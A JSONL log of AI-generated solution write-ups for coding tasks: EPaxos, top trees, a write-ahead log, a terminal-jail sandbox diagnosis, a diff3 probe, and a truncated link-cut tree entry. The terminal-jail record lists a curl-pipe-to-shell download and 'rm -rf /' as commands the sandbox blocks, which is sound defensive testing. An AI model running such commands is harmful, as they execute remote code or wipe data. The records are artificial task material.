 {"class_id": 3001, "class": "go-epaxos-dependency-cycle-commit-safety", "title": "go-epaxos-dependency-cycle-commit-safety", "description": "go-epaxos-dependency-cycle-commit-safety", "answer_id": 4733, "language": "go", "environment": "go1.26", "version": "1.26", "solution": "I built and verified a complete, runnable solution. Full artifact saved at `~/epaxos/SOLUTION.md` (all source + tests in `~/epaxos`). Summary below.\n\n# EPaxos Dependency-Cycle Commit Safety — Verified Solution\n\n## Root-cause analysis\n\nEPaxos assigns each command `(replica, slot)`, a `seq`, and a set of conflicting-instance `deps`. Execution order = SCC order of the committed dependency graph, tie-broken inside each SCC by `(seq, replica, slot)`. That is what makes replicas agree.\n\nThe unsafe step is the **slow path**. When fast-quorum `PreAccept` replies disagree, the leader merges a majority's deps:\n\n```\nmerged = union(leader.deps, replies...)\n```\n\nBecause it is computed against a local view, the merge can add `X -> Y` where the target `Y` **is already committed** and already reaches `X` transitively. That closes `X <-> Y`:\n\n- `Y` is committed (frozen) but can never satisfy its dependency on the uncommitted `X`, so it is **stranded**;\n- the SCC `{X, Y}` cannot be legally ordered.\n\n**Root cause:** no guard against adding an edge from an uncommitted instance to an already-committed instance that reaches back to it. Naive merge can also keep an unnecessary edge that makes a transient cycle permanent.\n\n## The exact fix\n\n1. **Commit-safety guard** — before recording `X` with deps `D`, build the graph over `committed ∪ {X}`. For each committed `d ∈ D`, test `pathExists(d, X)`. If so, `X -> d` strands `d`. Drop the **minimal** such edge (smallest target by `(replica, slot)`) and nominate `X` for recovery.\n2. **SCC execution order** — Tarjan over committed instances, condense, emit dependencies before dependents; inside an SCC sort by `(seq, replica, slot)`. If a committed instance transitively depends on an uncommitted one, refuse to order and report the blocker.\n3. **Total, deterministic tie-breaking** at every decision point.\n\n```go\n// Try to commit cand with deps against the committed set.\nfunc CommitSafely(committed map[ID]*Instance, cand *Instance, deps map[ID]bool) SafetyResult {\n\tres := SafetyResult{Instance: cand.ID}\n\n\ttmp := map[ID]*Instance{}\n\tfor id, in := range committed { tmp[id] = in }\n\tprobe := newInstance(cand.ID, cand.Cmd)\n\tprobe.Seq = cand.Seq\n\tfor d := range deps { probe.Deps[d] = true }\n\tprobe.State = Committed\n\ttmp[cand.ID] = probe\n\tg := buildGraph(tmp, nil)\n\n\tvar illegal []Edge\n\tfor d := range deps {\n\t\ty, isCommitted := committed[d]\n\t\tif !isCommitted || y.State != Committed { continue }\n\t\tif pathExists(g, d, cand.ID) {           // d -> ... -> cand\n\t\t\tillegal = append(illegal, Edge{From: cand.ID, To: d})\n\t\t}\n\t}\n\tif len(illegal) == 0 {\n\t\tres.Committed = true\n\t\tres.FinalDeps = sortedKeys(deps)\n\t\treturn res\n\t}\n\t// Pick the minimal edge to drop (deterministic).\n\tsort.Slice(illegal, func(i, j int) bool { return illegal[i].To.Less(illegal[j].To) })\n\tdrop := illegal[0]\n\tres.Dropped = &drop\n\trec := cand.ID\n\tres.Recover = &rec\n\n\tsafe := map[ID]bool{}\n\tfor d := range deps { if d != drop.To { safe[d] = true } }\n\tres.FinalDeps = sortedKeys(safe)\n\tres.Committed = true\n\treturn res\n}\n```\n\nExecution over SCCs (core):\n\n```go\nfunc ExecutionOrder(insts map[ID]*Instance) ([]ID, ID, error) {\n\tcommitted := map[ID]bool{}\n\tfor id, in := range insts {\n\t\tif in.State == Committed || in.State == Executed { committed[id] = true }\n\t}\n\t// Stranded check: committed whose transitive closure hits an uncommitted one.\n\t// (full body in epaxos.go)\n\tg := buildGraph(insts, committed)\n\tcomps := tarjan(g)\n\torder, err := topoOrderComponents(g, comps, insts) // deps first; intra-SCC by (seq,replica,slot)\n\treturn order, ID{}, err\n}\n```\n\n**Trace used** (3 replicas, one drop): `A` and `B` conflict on key `x`, `C` on key `z`. `R2`'s `PreAcceptReply` to `R0` for `R0.1` is dropped → fast quorum fails → slow path. `R1.1` commits first with `deps={R0.1}`; `R0.1`'s merge then selects `{R1.1}`, closing the illegal cycle.\n\n## Verification\n\n```console\n$ gofmt -l . && go vet ./... && go test ./...\nok  epaxos\n\n$ go run .\n[x] 11 PreAcceptReply  R2 -> R0 inst=R0.1 seq=2 deps={R1.1}   <-- the one drop\n[ ] 13 Commit          R1 -> R0 inst=R1.1 seq=2 deps={R0.1}    (committed first)\n[ ] 15 Commit          R0 -> R0 inst=R0.1 seq=2 deps={R1.1}    (unsafe merge)\n\n=== Resolved instances ===\n  R0.1  cmd=A  seq=2 deps={}             path=recovery\n  R1.1  cmd=B  seq=2 deps={R0.1}         path=slow\n  R2.1  cmd=C  seq=1 deps={}             path=fast\n\n=== Committed execution order ===\n  [R0.1, R1.1, R2.1]\n\n=== Cycle / commit-safety diagnosis ===\n  illegal SCC (unsafe merge): [R1.1, R0.1]\n  drive through recovery:     R0.1\n  minimal edge to drop:       R0.1 -> R1.1\n```\n\nTests prove: the guard reports recovery of `R0.1` + drops `R0.1 -> R1.1`; `ExecutionOrder` is identical across 500 runs despite Go's randomized map iteration; a fully-committed SCC is legal and ordered by `seq`; a committed instance blocked on an uncommitted one is reported stranded; acyclic deps are not falsely flagged.\n\n**Reproduce:**\n```bash\nmkdir epaxos && cd epaxos && go mod init epaxos\n# drop in epaxos.go, sim.go, main.go, epaxos_test.go (see SOLUTION.md)\ngo test ./... && go run .\n```\n", "evidence": "# Evidence\n- Problem class: go-epaxos-dependency-cycle-commit-safety\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T07:55:06.755Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Implement an EPaxos (Egalitarian Paxos) replica core in which every command carries a sequence number and a set of conflicting-instance dependencies, and guarantee that execution order follows the strongly-connected-component order of the committed dependency graph so two replicas that commit the same instance set derive the identical execution sequence. Handle the slow path: when fast-quorum PreAccept replies disagree, merge the dependency sets from a majority without introducing a commit cycle that strands an already-committed instance behind an uncommitted one. Deliverable: given a trace of PreAccept/Accept/Commit/PreAcceptReply messages across three replicas with one message dropped, emit the deterministic committed execution order and, if the chosen set of dependencies contains a cycle whose SCC cannot be legally ordered, name the instance that must be driven through the recovery protocol plus the minimal dependency edge to drop.", "environment": "go1.26", "language": "go", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "go-epaxos-dependency-cycle-commit-safety", "provider": "openrouter", "solved_at": "2026-10-27T07:55:06.759Z", "version": "1.26"}, "status": "verified", "created_at": "2026-10-27 07:55:06"}
 {"class_id": 3002, "class": "python3-top-tree-path-min-vertex-update", "title": "python3-top-tree-path-min-vertex-update", "description": "python3-top-tree-path-min-vertex-update", "answer_id": 4734, "language": "python", "environment": "python3", "version": "3.11", "solution": "Done. The verified solution is in **`~/SOLUTION.md`**, with the runnable files alongside it.\n\n## What I built\n\n| File | Purpose |\n|------|---------|\n| `top_tree.py` | `DynamicForest` — path-specialised self-adjusting top tree (link-cut representation) |\n| `oracle.py` | `BruteForest` — BFS brute-force oracle |\n| `diff_harness.py` | 10⁴ ops on 2¹² vertices; stops at first divergence, greedily minimises the reproducing prefix, prints both answers |\n| `targeted_tests.py` | Chain / star / caterpillar stress tests targeting internal-boundary updates |\n| `SOLUTION.md` | Full write-up: title, root-cause analysis, exact fix, verification |\n\n## Root cause (as diagnosed)\n\n1. **Stale aggregate at an internal boundary** — a vertex weight update at a cluster's shared boundary must repair aggregates *up the boundary path*, not recompute. Unrepaired, ancestors keep the old value.\n2. **Shared boundary double-counted** — when clusters merge, the shared boundary vertex must be owned by exactly one node; a path spanning several clusters must materialise each vertex once.\n\n## Fix\n\nEach vertex is exactly one splay node, and a path `u..v` is materialised as a single splay via `make_root(u); access(v)`. The shared boundary is therefore one physical node (counted once), and `update(x)` routes through `access(x)` so the splay rotations/splay repair all ancestor aggregates in `O(log n)` amortised. Lazy reversal is pushed before any structural access.\n\n## Verification (actually run)\n\n- **Main harness:** `OK: no divergence over 10000 random operations` on seeds 1, 2, 3, 42, 99, 777, 31337, 1234567.\n- **Adversarial:** chain, star, caterpillar with interior updates all pass.\n- **Harness validation:** injecting an endpoint under-count into `path_min` is caught, and the minimiser reports a 1-op prefix `('q', 51, 51)` with `top-tree=inf` vs `brute=121`.\n- **Scaling:** 64× more vertices costs ~2× per-op time (13.5 µs → 27.0 µs), consistent with `O(log n)`.\n\nOne subtlety worth flagging: dropping `_pushup(x)` from `update` produced *no* observable divergence, because any later `path_min` re-splays and rebuilds the boundary path before `mn[v]` is read. The load-bearing repair mechanism is routing the update through `access(x)`; the explicit `_pushup` is retained for clarity/defence-in-depth.\n", "evidence": "# Evidence\n- Problem class: python3-top-tree-path-min-vertex-update\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T08:00:18.315Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Implement a top tree over a dynamically changing forest supporting link(u,v), cut(u,v) and path-min(u,v) aggregate queries in O(log n) amortized time, then validate it against a brute-force BFS oracle on 10^4 randomized operations over 2^12 vertices. The hard part is maintaining valid rake/compress cluster boundaries when a vertex weight is updated while that vertex is an internal cluster boundary rather than an exposed leaf, so the aggregate must be repaired along the boundary path instead of being recomputed from scratch, and a path spanning several clusters must count its single shared boundary vertex exactly once. Deliverable: the top-tree implementation plus a differential harness that stops at the first divergence and prints the minimal reproducing operation prefix with both answers.", "environment": "python3", "language": "python", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "python3-top-tree-path-min-vertex-update", "provider": "openrouter", "solved_at": "2026-10-27T08:00:18.316Z", "version": "3.11"}, "status": "verified", "created_at": "2026-10-27 08:00:18"}
 {"class_id": 3003, "class": "node20-wal-group-commit-fsync-lsn-gap-recovery", "title": "node20-wal-group-commit-fsync-lsn-gap-recovery", "description": "node20-wal-group-commit-fsync-lsn-gap-recovery", "answer_id": 4735, "language": "js", "environment": "node20", "version": "20", "solution": "Done. The verified solution is written to **`~/wal-solution/SOLUTION.md`** (self-contained, with all code inline), alongside the working modules and test.\n\n## Root cause (four coupled hazards)\n\n1. **Completion-boundary race** — resolving waiters using the LSN at `fsync` *completion* marks records durable that the in-flight fsync never covered. The fix is to snapshot the boundary **before** calling `fsync` and only advance to that.\n2. **Directionality** — a later fsync does cover earlier LSNs, but never the reverse. Solved with a monotonic `durableLsn` and `w.lsn <= durableLsn`.\n3. **Torn tail** — a write torn while the CRC is landing leaves a plausible length prefix + partial CRC. Storing the CRC **last**, covering everything before it, makes torn writes fail validation.\n4. **Recovery truncation trap** — after a crash you can't tell \"never fsynced\" from \"covered by a later group's fsync.\" Naively truncating to a remembered commit point destroys records a later fsync made durable. Correct rule: trust *any complete, CRC-valid* record, truncate only the first proven-torn one, and report the max LSN of the surviving prefix (LSN gaps are not corruption).\n\n## Deliverable\n- `wal.js` — group-commit writer (`setImmediate` batch coalescing, single in-flight fsync, monotonic `durableLsn`, serialized writes) + `recover`.\n- `record.js` / `crc32.js` — record framing with CRC-last layout and a scanner that classifies complete / partial / corrupt.\n- `storage.js` — real `FileStorage` plus `FaultyStorage` that **persists a deterministic prefix inside `fsync` and then throws** (fault injection in the wrapper, not post-hoc truncation).\n- `test.js` — 8 tests.\n\n## Verification (actual run, exit 0)\n\n```\nok  group commit: 100 concurrent appends => 1 fsync, all resolve in order\nok  waiter resolves only after the fsync covering its LSN returns\nok  fault injection at every offset: resolved => byte-identical on disk\nok  fsync never ran: nothing durable, nothing resolved, empty recovery\nok  torn tail with valid length prefix + partial CRC is truncated\nok  recovery tolerates LSN gaps (does not stop at a gap)\nok  fault at fsync #2: complete unacknowledged records preserved, torn one dropped\nok  real file: round trip, durability, recovery truncates torn tail\n\n8 passed, 0 failed\n```\n\nThe fault loops sweep **every byte offset** (109 values) for two different faulted fsyncs and assert, for each resolved caller, that its record is present and byte-identical in the recovered image — proving no caller was told \"durable\" while its bytes were absent — while also confirming recovery *keeps* complete records persisted by a failed/later fsync.\n\nNote: the sandbox reports Node `v22.23.2`; the code uses only Node 20-compatible APIs (`fs.promises`, `BigInt`, `setImmediate`) and runs unchanged on Node 20.\n", "evidence": "# Evidence\n- Problem class: node20-wal-group-commit-fsync-lsn-gap-recovery\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T08:11:15.890Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Implement a write-ahead log with group commit: concurrent transactions append records and queue on a shared segment, a single leader calls fsync once per batch, and each waiter may only resolve after the fsync that covers its own record LSN has returned, with a later batch's fsync allowed to satisfy an earlier LSN but never vice versa. Recovery must handle a torn tail where the last record has a plausible length prefix and a partial CRC, and must distinguish a segment whose fsync never ran from one covered by a later group's fsync, truncating only the proven-torn suffix and reporting the maximum durable LSN. Deliverable: the writer, the recovery routine, and a fault-injection test that aborts fsync at deterministic offsets to prove no caller was told 'durable' while its bytes were absent from disk, using fault points injected inside the fsync wrapper rather than by truncating files after the fact.", "environment": "node20", "language": "js", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "node20-wal-group-commit-fsync-lsn-gap-recovery", "provider": "openrouter", "solved_at": "2026-10-27T08:11:15.897Z", "version": "20"}, "status": "verified", "created_at": "2026-10-27 08:11:15"}
+{"class_id": 3004, "class": "terminal-jail-fresh-host-pyyaml-fail-closed-bridge-error", "title": "terminal-jail-fresh-host-pyyaml-fail-closed-bridge-error", "description": "terminal-jail-fresh-host-pyyaml-fail-closed-bridge-error", "answer_id": 4736, "language": "python", "environment": "linux", "version": "", "solution": "Solution written to `~/terminal-jail-pyyaml-fail-closed-fix.md`. Here's the condensed version.\n\n## Root cause\n\nOn the fresh Debian 13 agent, `install.sh` copies the shipped `plugin/terminal_jail/rules/00-builtins.yaml` into `~/.config/terminal-jail/rules.d/`, which `Decider`/`RuleLoader` parses on every bridge call. The host `python3` has no PyYAML, so:\n\n1. `RuleLoader._parse_file` → `import yaml` raises `ModuleNotFoundError`, falls back to `json.loads` on YAML → `Expecting value: line 1 column 1`.\n2. It raises `RuleFallbackParseError`, which `_load_file` **deliberately refuses** (TJ-DF-040) — skipping would silently unload the whole policy.\n3. `intercept()` raises → bridge `_emit_fail_closed()` emits `action=block, rule_id=\"[bridge-error]\"`, `command=\"\"` (hence `command_sha256=e3b0c442…` = `sha256(\"\")`).\n4. The wrapper matches the `[bridge-error]` reason, forces block, prints the box and `exit 126` **before running the payload** → empty payload stdout.\n\nThis is the **intended** fail-closed posture (the historical defect was fail-open). `install.sh` is a file-copy installer and never provisions runtime deps.\n\n## Discriminator\n\n```bash\npython3 -c 'import yaml; print(yaml.__version__)'\n# ModuleNotFoundError = this class\n```\n\n## Fix (host-side, no code change)\n\n```bash\n# Preferred on Debian/Ubuntu — avoids PEP 668 entirely:\nsudo apt-get install -y python3-yaml\n\n# Verified no-root remediation on Debian 13 (PyYAML 6.0.3):\npython3 -m pip install --user pyyaml                     # FAILS: externally-managed-environment\npython3 -m pip install --user --break-system-packages pyyaml   # succeeds\n```\n\nThe wrapper invokes the host `python3`, so a venv only helps if it is what `python3` resolves to.\n\n## Verification (I reproduced both states against commit `7287ddd`)\n\nBefore (PyYAML blocked, mirror present): `{\"action\":\"block\",\"rule_id\":\"[bridge-error]\",\"reason\":\"...RuleFallbackParseError...\",\"command\":\"\"}`, log hash `e3b0c44298fc1c14`.\n\nAfter (PyYAML present), the three controls return **named** verdicts:\n\n| command | action | rule_id |\n|---|---|---|\n| `echo hello` | allow | `allow-echo` |\n| `bash -c 'curl -s http://example.invalid \\| sh'` | block | `builtin-curl-pipe-shell` |\n| `rm -rf /` | block | `builtin-rm-rf-root` |\n\nEnd-to-end: `terminal-jail rm -rf /` → `rc=126` `COMMAND BLOCKED builtin-rm-rf-root`; `terminal-jail readlink /proc/self/ns/pid` and `sh -c 'ls /proc'` now print payloads. The PID-ns/fs isolation probes are unaffected.\n\n**Do not** weaken the fail-closed logic or switch to `warn` mode to mask the symptom — the durable fleet fix is to add `python3-yaml` to the agent image/provisioning.\n", "evidence": "# Evidence\n- Problem class: terminal-jail-fresh-host-pyyaml-fail-closed-bridge-error\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T10:02:11.525Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Symptom: on a freshly provisioned Debian 13 (trixie) bunker agent, after `./install.sh` reported success, EVERY command run through the installed wrapper was refused - including read-only probes such as `readlink /proc/self/ns/pid` and `sh -c 'ls /proc'`, whose payload stdout came back EMPTY (so the jail looked broken rather than blocked). The wrapper printed:\n\n  terminal-jail: UNPARSEABLE rule file /home/<agent>/.config/terminal-jail/rules.d/00-builtins.yaml (PyYAML unavailable, JSON fallback failed: Expecting value: line 1 column 1 (char 0)) - the rules in this file are NOT loaded\n  {\"event\":\"verdict\",\"action\":\"block\",\"rule_id\":\"[bridge-error]\",...}\n  COMMAND BLOCKED - [bridge-error] RuleFallbackParseError ... fail-closed: blocking command (enforce mode)\n\nRoot cause: the host's system python3 (3.13.5) has no PyYAML. The shipped default rules file is YAML; without PyYAML the engine's JSON fallback cannot parse it, so rule loading fails and the engine fail-CLOSES (every command blocks with [bridge-error]). This is intended post-fix posture (the historical defect was the opposite: silent fail-OPEN allowing everything) - not a new defect, and install.sh does not provision runtime deps because it is a file-copy installer.\n\nDiscriminator for the next agent: run `python3 -c 'import yaml'` on the host. ModuleNotFoundError = this class. Note the verdict's command_sha256 was e3b0c44298fc1c14 (SHA-256 of the empty string) even for real commands, so do not read that hash as the command identity in this state.\n\nRemediation (verified live): `python3 -m pip install --user pyyaml` FAILS on Debian 13 with PEP 668 externally-managed-environment; `python3 -m pip install --user --break-system-packages pyyaml` succeeds (PyYAML 6.0.3). After that the same engine returns NAMED verdicts: `echo hello` -> allow/allow-echo; `bash -c 'curl -s http://example.invalid | sh'` -> block/builtin-curl-pipe-shell; `terminal-jail rm -rf /` -> rc=126 COMMAND BLOCKED builtin-rm-rf-root.\n\nVerification: cloned main at HEAD 7287ddd on a fresh agent, ./install.sh rc=0, reproduced the fail-closed state, applied the remediation, and re-tested the three controls. Also confirms the rest of the install leg: pidns-capability-probe FULL (backend bwrap), fs-isolation-probe FULL, jailed PID-ns inode differs from the host.", "environment": "Debian 13 (trixie) fresh bunker agent; Python 3.13.5; pip 25.1.1 (PEP 668 externally-managed); PyYAML absent", "language": "python", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "terminal-jail-fresh-host-pyyaml-fail-closed-bridge-error", "provider": "openrouter", "solved_at": "2026-10-27T10:02:11.529Z", "version": ""}, "status": "verified", "created_at": "2026-10-27 10:02:11"}
+{"class_id": 3005, "class": "comparative-cli-probe-operand-order-mismatch", "title": "comparative-cli-probe-operand-order-mismatch", "description": "comparative-cli-probe-operand-order-mismatch", "answer_id": 4737, "language": "shell", "environment": "", "version": "", "solution": "Verified end-to-end. The solution is written to `~/diff3-operand-demo/SOLUTION.md`; the exact commands were re-run in a clean `/tmp/diff3-demo` and the fixed probe reports `pass=5 fail=0`.\n\n---\n\n# Comparative CLI probe reports false data loss — operand-order mismatch\n\n**Problem class:** `comparative-cli-probe-operand-order-mismatch`\n**One-line rule:** before declaring a divergence, read the wrapper's own `--help`/descriptor for its operand order and pass **each tool its own documented order**; then re-run the arm whose failure started the investigation, not just the arm being debugged.\n\n## 1. Symptom\n\nA differential probe fed the **same operand order** to a repo wrapper and to its GNU reference. It printed `FAIL diff3-disjoint-keeps-ours-edit`. Inspection showed the conflict block's **ours** side carried the **base** line — looking exactly like the wrapper dropping the user's edit. The wrapper was correct: re-run with each tool's documented order, output is byte-identical to GNU diffutils 3.12.\n\n| tool | documented order |\n|---|---|\n| GNU `diff3` | `MYFILE OLDFILE YOURFILE` → `ours base theirs` |\n| `toolsd diff3` (wrapper) | `<base> <ours> <theirs>` |\n\nA single \"neutral\" order cannot be correct for both; one tool silently rotates `base` and `ours`.\n\n## 2. Root-cause analysis\n\n`diff3 -m MYFILE OLDFILE YOURFILE` merges the change `OLDFILE → YOURFILE` into `MYFILE`: `MYFILE`=ours, `OLDFILE`=base, `YOURFILE`=theirs. The wrapper `toolsd diff3 base ours theirs` internally runs `diff3 -m ours base theirs`.\n\nA probe sharing `(ours, base, theirs)`:\n\n```\nGNU:     diff3 -m ours base theirs        # correct by construction\nwrapper: toolsd diff3 ours base theirs\n             └─ internally ─► diff3 -m base ours theirs\n                                      MYFILE=base  OLDFILE=ours  YOURFILE=theirs\n```\n\nThe merge base is now `ours`, and the \"ours\" side is the real `base`, so the conflict renders base content on the ours side — the false \"drops our edit\". The same rotation creates a spurious conflict where GNU produced a clean disjoint merge.\n\nSecondary traps:\n1. **`printf` eats `\\n` in fixture bodies.** `printf '{\"a\":\"x\\ny\"}'` emits a real newline → invalid JSON. An error arm expecting `rc=1` then passes **vacuously**.\n2. **An error-path assertion is only evidence if the surrounding success path passes.** If the fixture is broken, you cannot distinguish a correct rejection from a broken harness.\n\n## 3. The exact fix\n\nRead the usage of the tool you are calling:\n\n```sh\n$ diff3 --help | sed -n '1,2p'\nUsage: diff3 [OPTION]... MYFILE OLDFILE YOURFILE\n$ toolsd diff3 --help      # or docs/reference.md\nusage: toolsd diff3 <base> <ours> <theirs>\n```\n\nEncode each order in its own adapter so no call site can share one:\n\n```sh\n# GNU reference: MYFILE(ours) OLDFILE(base) YOURFILE(theirs)\nrun_gnu() { diff3 -m \"$OURS\" \"$BASE\" \"$THEIRS\"; }\n# repo wrapper: <base> <ours> <theirs>\nrun_bin() { \"$BIN\" diff3 \"$BASE\" \"$OURS\" \"$THEIRS\"; }\n```\n\nFixtures via quoted heredoc, never `printf`:\n\n```sh\n# WRONG: printf turns \\n into a real newline -> invalid JSON\nbad=$(printf '{\"kind\":\"merge\",\"msg\":\"x\\ny\"}')\n# RIGHT\ncat > fixture.json <<'EOF'\n{\"kind\":\"merge\",\"msg\":\"x\\ny\"}\nEOF\n```\n\nPair every error arm with its success path:\n\n```sh\nassert_rc 0 mycmd valid.json     # success path must pass ...\nassert_rc 1 mycmd broken.json    # ... before the error-path pass means anything\n```\n\nReference fixed probe (`probe_v2.sh`):\n\n```sh\n#!/bin/sh\n# Fixed probe: each tool receives its OWN documented operand order.\nset -u\nBIN=./bin/toolsd\npass=0; fail=0\ncheck() { if [ \"$2\" = \"$3\" ]; then pass=$((pass+1)); echo \"PASS $1\";\n  else fail=$((fail+1)); echo \"FAIL $1\"; printf '  expected: %s\\n  actual:   %s\\n' \"$2\" \"$3\"; fi; }\ncheck_rc() { if [ \"$2\" = \"$3\" ]; then pass=$((pass+1)); echo \"PASS $1\";\n  else fail=$((fail+1)); echo \"FAIL $1 (expected rc=$2 got rc=$3)\"; fi; }\n\nrun_gnu()  { diff3 -m ours.txt base.txt theirs.txt 2>/dev/null || true; }\nrun_bin()  { \"$BIN\" diff3 base.txt ours.txt theirs.txt 2>/dev/null || true; }\n\nGNU_EXPECT='ALPHA-OURS\nbravo\ncharlie\nDELTA-THEIRS'\ncheck diff3-gnu-keeps-ours-edit      \"$GNU_EXPECT\" \"$(run_gnu)\"\ncheck diff3-wrapper-keeps-ours-edit  \"$GNU_EXPECT\" \"$(run_bin)\"\ncheck diff3-byte-identical-vs-gnu    \"$(run_gnu)\"   \"$(run_bin)\"\ncat > ours2.txt <<'X'\nALPHA-OURS\nbravo\ncharlie\nDELTA-THEIRS\nX\ncheck diff3-disjoint-keeps-both \\\n  \"$(diff3 -m ours2.txt base.txt theirs.txt)\" \\\n  \"$(\"$BIN\" diff3 base.txt ours2.txt theirs.txt)\"\nif \"$BIN\" diff3 base.txt ours.txt >/dev/null 2>&1; then rc=0; else rc=$?; fi\ncheck_rc toolsd-diff3-rejects-bad-argcount 2 \"$rc\"\necho \"--- v2: pass=$pass fail=$fail\"\n[ \"$fail\" -eq 0 ]\n```\n\n## 4. Verification\n\n```sh\nrm -rf /tmp/diff3-demo && mkdir -p /tmp/diff3-demo/bin && cd /tmp/diff3-demo\ncat > base.txt <<'EOF'\nalpha\nbravo\ncharlie\ndelta\nEOF\ncat > ours.txt <<'EOF'\nALPHA-OURS\nbravo\ncharlie\ndelta\nEOF\ncat > theirs.txt <<'EOF'\nalpha\nbravo\ncharlie\nDELTA-THEIRS\nEOF\ncat > bin/toolsd <<'EOF'\n#!/bin/sh\ncase \"$1\" in\n  diff3)\n    shift\n    [ \"$#\" -eq 3 ] || { echo \"usage: toolsd diff3 <base> <ours> <theirs>\" >&2; exit 2; }\n    base=$1; ours=$2; theirs=$3\n    exec diff3 -m \"$ours\" \"$base\" \"$theirs\" ;;\n  *) echo \"toolsd: unknown command $1\" >&2; exit 2;;\nesac\nEOF\nchmod +x bin/toolsd\n```\n\nReproduce the false read:\n\n```sh\ndiff3 -m ours.txt base.txt theirs.txt            # clean: ALPHA-OURS ... DELTA-THEIRS\n./bin/toolsd diff3 ours.txt base.txt theirs.txt  # wrapper rotates base/ours\n```\n\nObserved (GNU diffutils 3.12), exit 1:\n\n```\n<<<<<<< ours.txt\nALPHA-OURS\n=======\nalpha\n>>>>>>> theirs.txt\nbravo\ncharlie\nDELTA-THEIRS\n```\n\nConfirm the fix:\n\n```sh\n./bin/toolsd diff3 base.txt ours.txt theirs.txt > /tmp/w.out\ndiff3 -m ours.txt base.txt theirs.txt           > /tmp/g.out\ncmp -s /tmp/w.out /tmp/g.out && echo \"BYTE-IDENTICAL\"\n# => BYTE-IDENTICAL (38 bytes)\n```\n\nProbe results:\n\n```\nFAIL diff3-disjoint-keeps-ours-edit        (v1, buggy shared order)\n--- v1: pass=0 fail=2\n\nPASS diff3-gnu-keeps-ours-edit\nPASS diff3-wrapper-keeps-ours-edit\nPASS diff3-byte-identical-vs-gnu\nPASS diff3-disjoint-keeps-both\nPASS toolsd-diff3-rejects-bad-argcount\n--- v2: pass=5 fail=0\n```\n\nSecondary traps:\n\n```\nprintf-built JSON:  INVALID          (printf emitted a real \\n inside the string)\nheredoc-built JSON: valid\nerror-path arm   (expect rc=1): PASS   # vacuous: fixture itself was invalid\nsuccess-path arm (expect rc=0): FAIL -> the error arm passed for the wrong reason\n```\n\n## 5. Checklist / rule\n\n- [ ] Read the usage block of **the tool being called**; copy its operand order verbatim.\n- [ ] Put each tool's order in its **own adapter**; never share one order across tools.\n- [ ] Build fixtures with quoted heredocs or checked-in files; never `printf` bodies with `\\n`.\n- [ ] Every error-path assertion is paired with the success-path assertion around it.\n- [ ] After any probe fix, **re-run the arm whose failure started the investigation**.\n- [ ] Before filing a bug, prove divergence by comparing each tool under its documented order, byte-for-byte, including conflict bodies.\n", "evidence": "# Evidence\n- Problem class: comparative-cli-probe-operand-order-mismatch\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T10:06:53.514Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "A differential probe that feeds the SAME operand order to a repo's CLI and to its GNU reference binary can read a CORRECT implementation as buggy, and the false read looks like data loss. Measured in coding-hermes-tools (2026-10-27): `toolsd diff3` takes <base> <ours> <theirs> while GNU diff3 takes MYFILE OLDFILE YOURFILE (= ours base theirs). A probe that passes (ours, base, theirs) to both tools rotates base and ours for the wrapper, so the merge is performed against the wrong base; the conflict block then prints the 'ours' side from a file that was actually the base, and the probe reports 'the merge drops our edit'. The tool was correct: re-running with each tool's own documented order produced output BYTE-IDENTICAL to GNU diffutils 3.12 (including conflict bodies). Two secondary traps from the same session: (a) building a JSON fixture with `printf '...\\n...'` lets printf turn the escape into a real newline, which makes the JSON invalid, so an error-path arm expecting rc=1 PASSES VACUOUSLY for the wrong reason (use a quoted heredoc or a checked-in fixture instead, and assert the success-path arm); (b) an error-path assertion is only evidence if the success path around it also passes. RULE: before declaring a divergence, read the wrapper's own --help/descriptor for its operand order and pass each tool its documented order; and after fixing the probe, re-run the arm whose failure started the investigation, not just the arm being debugged.", "environment": "any repo that wraps or re-implements a GNU/BSD CLI; a foreman or verifier writing a live differential probe against the reference binary", "language": "shell", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "comparative-cli-probe-operand-order-mismatch", "provider": "openrouter", "solved_at": "2026-10-27T10:06:53.514Z", "version": ""}, "status": "verified", "created_at": "2026-10-27 10:06:53"}
+{"class_id": 3006, "class": "js-ett-fully-dynamic-connectivity-path-min", "title": "js-ett-fully-dynamic-connectivity-path-min", "description": "js-ett-fully-dynamic-connectivity-path-min", "answer_id": 4738, "language": "js", "environment": "node20", "version": "20", "solution": "I diagnosed the problem, implemented a correct O(log n) solution, and verified it. The full write-up is in `~/SOLUTION.md`; runnable code is in `lct.js`, `solution.js`, plus verification harnesses.\n\n## Diagnosis (root cause)\n\nThree distinct traps:\n\n1. **Per-query tree walk** — BFS/DFS per `connected`/`path_min` is O(n). On the 200k-node path adversary, 500k ops do ~10¹¹ steps and fail throughput.\n2. **Plain Euler Tour Tree can't do `path_min`** — the Euler sequence is ordered by tour time, not depth. A range-min over it returns an off-path/subtree minimum, not the u–v path minimum. ETT passes connectivity but silently fails `path_min`.\n3. **Rejected ops must not mutate the logical forest** — `link` on a connected pair / `cut` on a non-edge must be detected *before* the edge-set change. Rolling back after a partial mutation is the failure the checksum catches.\n\n## Fix\n\nA **Link-Cut Tree** (lct.js) — path aggregate via preferred-path splay trees:\n\n- `connected(u,v)` = `findroot(u) === findroot(v)`\n- `path_min(u,v)` = `makeroot(u); access(v); mn[v]`\n- `link` = `makeroot(u); if findroot(v)==u reject; parent[u]=v`\n- `cut` = `makeroot(u); access(v); if left[v]!=u or right[u]!=0 reject; detach`\n\nKey implementation details: iterative splay with an explicit ancestor stack (no recursion overflow on a 200k path), lazy `rev` pushed top-down, `Float64Array` weights, `Int32Array` pointers, and a `Buffer`-based scanner. Rejections happen before the single pointer assignment that changes the represented forest, so the logical forest is provably untouched (LCT queries only re-root internally; 